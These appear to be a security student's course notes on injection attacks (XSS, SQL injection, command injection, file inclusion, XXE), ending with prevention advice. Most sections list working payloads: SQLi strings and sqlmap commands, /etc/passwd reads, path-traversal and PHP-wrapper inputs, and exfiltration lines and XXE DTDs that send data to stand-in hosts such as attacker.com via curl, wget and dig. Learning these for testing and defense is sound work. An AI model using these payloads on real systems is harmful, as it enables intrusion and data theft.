### Categories of Injection Attacks
- **Database interpreters** 
- **Operating system command shells** execute system commands, enabling command injection
- **Web browsers** interpret HTML, CSS, and JavaScript, allowing cross-site scripting (XSS)
- **XML parsers** process XML documents, creating XXE vulnerabilities
- **File systems** handle file paths and names, enabling local file inclusion
- **HTTP clients** make web requests, allowing server-side request forgery

# Types of Injection Vulnerabilities
##  1, Cross-Site Scripting (XSS) Attacks
### A. Reflected xss

also known as non-persistent XSS, occurs when user input is immediately returned by the web application without proper sanitisation
**Where Reflected XSS Exists**
- **Search functionality:** Search terms displayed in results pages
- **Error messages:** User input included in error responses
- **Form validation:** Invalid input echoed back to users
- **URL parameters:** Query parameters displayed on the page
- **Login pages:** Username or error messages after failed attempts
- **Contact forms:** User data reflected in confirmation messages
**How to Find Reflected XSS**
- **Map input points:** Identify all locations where user input appears in the response
- **Test with unique strings:** Use distinctive markers to track where input appears
- **Examine source code:** Check if input appears in HTML, attributes, or JavaScript contexts
- **Test encoding:** Verify if special characters are properly encoded
- **Context analysis:** Understand the HTML context where input appears
#### Basic XSS Testing Payloads
![Screen Shot 2025-10-24 at 4.11.35 PM.png](https://s3.amazonaws.com/alx-intranet.hbtn.io/uploads/medias/2025/10/5ddcd06d7ed6a1ce1779009819cf62b9fb441316.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIARDDGGGOUVEGIJRO5%2F20260912%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20260912T084418Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=7d0ba385a2395f9e56fc973d2fd7ef8f4280b2929d11c2c92addc61cc368f4c9)

### B. Stored xss
also called persistent XSS, occurs when malicious scripts are permanently stored on the target server and then served to users who access the affected functionality. 
**Where Stored XSS Exists**
- **Comment systems:** Blog comments, product reviews, forum posts
- **User profiles:** Profile descriptions, status messages, bio fields
- **Message boards:** Discussion forums, chat applications
- **File uploads:** File names, metadata, or content displayed to users
- **Admin panels:** Log entries, user-generated reports
- **Wiki systems:** User-editable content pages
- **Social features:** Posts, shares, user-generated content

**Testing for Stored XSS**
1. **Identify storage points:** Find all locations where user input is stored and later displayed
2. **Submit test payloads:** Insert XSS payloads into storage fields
3. **Trigger display:** Navigate to pages where the stored content is displayed
4. **Verify execution:** Confirm if the payload executes in the browser
5. **Test different contexts:** Ensure testing covers various display contexts

**Advanced Testing Considerations:**

- Test with different user privilege levels
- Check if payloads execute for other users
- Verify if admin panels display user content without proper encoding
- Test file upload functionality for stored XSS in filenames or metadata
### C. DOM -based XSS

## 2, [[SQL Injection Attacks]]

**SQL injection commonly appears in:**

- **Login forms:** Username and password fields
- **Search functionality:** Search terms used in database queries
- **URL parameters:** ID parameters for retrieving records
- **Form inputs:** Any form field that queries the database
- **Cookie values:** Session data used in queries
- **HTTP headers:** User-Agent, Referer headers used in logging
- **API endpoints:** REST API parameters

**Start with simple payloads to identify SQL injection:**

1. **Single quote test:** Submit a single quote (') to break SQL syntax
2. **Boolean logic:** Use OR statements to modify query logic
3. **Comment injection:** Use SQL comments to bypass parts of queries
4. **UNION attacks:** Combine results from multiple queries
5. **Error analysis:** Examine error messages for SQL syntax clues

````
-- Basic syntax breaking
'
"
')
")

-- Boolean-based tests
' OR '1'='1
' OR 1=1--
admin'--

-- UNION-based tests
' UNION SELECT null--
' UNION SELECT 1,2,3--

-- Comment variations
' OR 1=1#
' OR 1=1/*
' OR 1=1--

-- database version
for orecle db SELECT * FROM v$version

-- To list the tables in the DB
SELECT * FROM information_schema.tables


````

For a `UNION` query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

### Blind SQL Injection
when applications are vulnerable to SQL injection but don't display database errors or query results directly.
Attackers must infer information about the database through the application's behavior, such as response times, HTTP status codes, or subtle differences in page content.

Advanced Blind Testing Techniques
- Boolean-Based Blind SQLi
````
-- Test for boolean response differences
' AND 1=1--  (should return normal response)
' AND 1=2--  (should return different response)

-- Extract database name length
' AND LENGTH(DATABASE())=1--
' AND LENGTH(DATABASE())=2--
-- Continue until finding correct length

-- Extract first character of database name
' AND ASCII(SUBSTRING(DATABASE(),1,1))=97--  (test for 'a')
' AND ASCII(SUBSTRING(DATABASE(),1,1))=98--  (test for 'b')
````

- Time-Based Blind SQLi
````
-- MySQL time delays
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--

-- PostgreSQL time delays
'; SELECT pg_sleep(5)--

-- SQL Server time delays
'; WAITFOR DELAY '00:00:05'--

--trigger an out-of-band network interaction
READ MORE ON THIS
````
### Automated Tools: SQLMap
can identify and exploit SQL injection vulnerabilities. However, it can cause significant damage to databases through aggressive testing techniques. **Never use SQLMap against systems you don't own or without explicit permission.**

Basic SQLMap usage for vulnerability identification:

````
# Basic URL testing
sqlmap -u "http://target.com/page.php?id=1"

# POST request testing with data
sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass"

# Cookie-based testing
sqlmap -u "http://target.com/page.php" --cookie="PHPSESSID=abc123"

# Safe testing (reduce risk of damage)
sqlmap -u "http://target.com/page.php?id=1" --level=1 --risk=1

# Enumerate databases (only after confirming vulnerability)
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Extract specific database tables (be very careful)
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
````

## 3. Command injection attacks
Command injection commonly appears in applications that:

- **File operations:** Converting, processing, or manipulating files
- **Network utilities:** Ping, traceroute, or network diagnostic tools
- **System utilities:** User management, system information gathering
- **Image processing:** Resizing, converting, or editing images
- **PDF generation:** Creating or manipulating PDF documents
- **Backup utilities:** Creating or extracting archive files
- **Email functions:** Sending emails through system mail utilities

Command injection testing approach:

1. **Command separators:** Use ; && || | to chain commands
2. **Command substitution:** Use backticks or $() for command substitution
3. **Output redirection:** Redirect command output to observable locations
4. **Time delays:** Use sleep or ping commands to cause delays
5. **DNS lookups:** Trigger DNS queries to controlled domains

````
# Command separators
; whoami
&& whoami
|| whoami
| whoami

# Command substitution
`whoami`
$(whoami)

# Time-based detection
; sleep 10
&& ping -c 4 127.0.0.1

# File system interaction
; ls /etc/passwd
&& cat /etc/passwd
````

Methods for detecting blind command injection:

- **DNS exfiltration:** Trigger DNS lookups to attacker-controlled domains
- **HTTP requests:** Make HTTP requests to external servers
- **File system evidence:** Create files in web-accessible directories
- **Time-based delays:** Cause measurable delays in application responses
- **Email notifications:** Send emails to attacker-controlled addresses

````
# DNS exfiltration
; nslookup $(whoami).attacker.com
&& dig $(id).evil.com

# HTTP exfiltration
; curl http://attacker.com/$(whoami)
&& wget http://evil.com/receive.php?data=$(id)

# File-based evidence
; touch /var/www/html/pwned.txt
&& echo "pwned" > /tmp/evidence

# Time-based confirmation
; sleep 10 && echo "executed"
````

## 4. File inclusion Attacks
Local File Inclusion (LFI) vulnerabilities allow attackers to include and potentially execute local files on the server through manipulation of file inclusion mechanisms.

LFI commonly appears in:

- **Template systems:** Dynamic page inclusion based on parameters
- **Language selection:** Including language files based on user choice
- **Theme/skin selection:** Loading CSS or template files
- **File viewing:** Displaying files based on user requests
- **Configuration loading:** Including config files dynamically
- **Plugin systems:** Loading modules or extensions

Basic LFI testing techniques:

1. **Path traversal:** Use ../ sequences to navigate directories
2. **Absolute paths:** Try direct paths to sensitive files
3. **Null byte injection:** Use %00 to truncate file extensions
4. **Wrapper exploitation:** Use PHP wrappers for code execution
5. **Log file inclusion:** Include log files containing user input

````
# Basic path traversal
../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts

# Absolute paths
/etc/passwd
/proc/version
/var/log/apache/access.log

# Null byte injection (older PHP versions)
../../../etc/passwd%00

# PHP wrappers
php://filter/convert.base64-encode/resource=index.php
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
````

Advanced bypass methods include:

- **Double encoding:** URL encode characters multiple times
- **Unicode encoding:** Use alternative character representations
- **Case variation:** Mix uppercase and lowercase in paths
- **Redundant path segments:** Use ./ and redundant directory references
- **Alternative separators:** Use different path separator characters
- **Length limits:** Use very long paths to overflow buffers

````
# Double URL encoding
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Unicode alternatives
\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd

# Mixed case and redundant paths
..%2F..%2F..%2Fetc%2Fpasswd
./../../etc/passwd
.././.././.././etc/passwd

# Alternative wrappers and protocols
zip://shell.jpg%23shell.php
phar://uploads/shell.jpg/shell.php
expect://whoami
````


## 5. XML External Entity (XXE)  attacks
XXE vulnerabilities commonly appear in:

- **API endpoints:** REST APIs accepting XML input
- **File upload:** Processing XML, SVG, or Office documents
- **Configuration parsing:** Reading XML configuration files
- **SOAP services:** Web services using XML messaging
- **RSS/Atom feeds:** Processing syndication feeds
- **Data import:** Importing data from XML formats
- **Document processing:** Handling DOCX, XLSX, or other XML-based formats

Basic XXE testing methodology:

1. **Entity definition:** Define external entities in XML DTD
2. **File inclusion:** Reference local files through entities
3. **Network requests:** Make HTTP requests to external servers
4. **Error message analysis:** Examine error responses for file content
5. **Blind detection:** Use time delays or DNS queries for confirmation

````
<!-- Basic file inclusion -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- HTTP request to external server -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<root>&xxe;</root>

<!-- Windows file inclusion -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
]>
<root>&xxe;</root>
````
Out-of-band XXE extraction techniques:

- **Parameter entity abuse:** Use parameter entities to bypass restrictions
- **HTTP data exfiltration:** Send file content via HTTP requests
- **DNS data extraction:** Encode data in DNS subdomain queries
- **FTP data transfer:** Use FTP protocol for data exfiltration
- **Error-based extraction:** Force parsing errors that reveal file content

````
<!-- Out-of-band data exfiltration via HTTP -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
    %xxe;
]>
<root>&send;</root>
````

External DTD Configuration
````
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/receive.php?data=%file;'>">
%eval;
````

DNS Exfiltration Payload Examples
````
<!-- DNS-based data exfiltration -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY % xxe SYSTEM "http://attacker.com/blind.dtd">
    %xxe;
]>
<root></root>
````

DNS Blind DTD Configuration
````
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.attacker.com/'>">
%eval;
%exfil;
````
#  Prevention Strategies for Injection Attacks
- Input Validation
- Output Encoding
	-  HTML encoding for HTML contexts
	- JavaScript encoding for JS contexts
	- URL encoding for URL parameters
	- SQL parameter binding for database queries
	- Context-aware encoding libraries
- Parameterized Queries
	- Separate SQL code from data
	- Use ORM frameworks appropriately
	- Avoid dynamic query construction
	- Implement stored procedures carefully
	- Regular code review for SQL injection
- Principle of Least Privilege

Implement comprehensive XSS protections:

- **Content Security Policy (CSP):** Implement strict CSP headers
- **HTTPOnly cookies:** Prevent JavaScript access to session cookies
- **SameSite cookies:** Protect against CSRF and some XSS scenarios
- **Template engines:** Use auto-escaping template systems
- **DOM sanitization:** Use trusted HTML sanitization libraries

Secure XML processing configuration:

- **Disable external entities:** Configure parsers to reject external entities
- **Disable DTD processing:** Turn off DTD processing entirely when possible
- **Use simple data formats:** Consider JSON instead of XML for APIs
- **Input validation:** Validate XML structure and content
- **Secure parsing libraries:** Use well-maintained, secure XML libraries